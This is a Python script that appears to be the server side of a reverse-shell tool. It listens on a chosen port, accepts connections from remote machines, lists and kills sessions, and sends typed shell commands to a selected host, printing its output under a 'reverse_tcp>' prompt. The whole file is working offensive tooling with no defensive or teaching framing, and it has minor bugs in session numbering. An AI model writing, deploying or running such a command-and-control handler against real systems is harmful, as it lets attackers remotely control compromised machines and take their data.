#!/usr/bin/python3
import socket
import sys
import threading
import time

client_list = []
_is_running = []

session = None
lock = threading.Lock()
def print_sessions(client_list: socket):
    for client in client_list:
        print('1 - ' + client.getpeername()[0])

def handle_new_client(client: socket, client_list: list, _is_running: bool, t_id: int):
    while _is_running[t_id]:
        data = client.recvfrom(1024)[0].decode('ISO-8859-1')
        if len(data) == 0:
            client_list.remove(client)
            break
        else:
            lock.acquire()
            try:
                print('\n' + data)
            finally:
                lock.release()

def start_server(server: socket, client_list: list):
    print("Started listening....")
    server.listen(5)
    while True:
        conn, addr = server.accept()
        print("\nNew connection from: " + str(addr))
        client_list.append(conn)
        _is_running.append(False)
        print("reverse_tcp>", end='', flush=True)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
addr_port = (sys.argv[1], int(sys.argv[2]))

server.bind(addr_port)
server_t = threading.Thread(target=start_server, args=(server, client_list))
server_t.start()

while True:
    while session is None:
        nc_cmd = input("reverse_tcp>")
        commands = nc_cmd.split(' ')
        
        if commands[0] == 'session':
            if commands[1] == 'list':
                print_sessions(client_list)
            elif commands[1] == 'start':
                try:
                    session = int(commands[2]) - 1
                except (IndexError, ValueError):
                    print("You must informe the session id")
            elif commands[1] == 'kill':
                sock = client_list[int(commands[2]) - 1]
                sock.close()
                client_list.remove(sock)
                _is_running.remove(_is_running[int(commands[2]) - 1])
            else:
                print("Command not found")
        elif commands[0] == 'exit':
            sys.exit(0)
        else:
            print("Command not found")
    reverse_tcp = client_list[session]
    _is_running[session] = True
    thr = threading.Thread(target=handle_new_client, args=(reverse_tcp, client_list, _is_running, session))
    thr.start()

    while session is not None:
        lock.acquire()
        try:
            cmd = input("Cmd: ")
        finally:
            lock.release()
        
        if cmd == "exit":
            print("Finishing session")
            _is_running[session] = False
            session = None
        else:
            reverse_tcp.sendall((cmd + '\n').encode('utf-8'))
        time.sleep(1)
# print(conn, addr)
# threading.Thread(target=recv_and_print, args=(conn, )).start()

# cmd = input("Type command$ ~ ")
# conn.sendall(cmd.encode('utf-8'))
server.close()